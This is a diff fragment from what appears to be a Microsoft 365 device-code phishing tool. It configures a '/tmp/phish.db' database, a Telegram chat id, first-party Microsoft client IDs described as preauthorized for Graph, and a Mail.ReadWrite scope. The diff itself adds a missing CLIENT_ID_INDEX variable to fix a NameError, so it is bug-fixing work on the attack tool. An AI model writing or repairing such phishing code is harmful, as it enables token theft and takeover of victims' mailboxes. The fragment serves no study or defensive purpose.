@@ -15,10 +15,11 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
-    "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools (preauthorized for Graph)
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI (also preauthorized for Graph)
-    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell (Graph fallback)
+    "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
 ]
+CLIENT_ID_INDEX = 0  # THIS WAS MISSING - FIXES THE NameError
 
 DEVICE_CODE_SCOPE = (
     "https://graph.microsoft.com/Mail.ReadWrite "
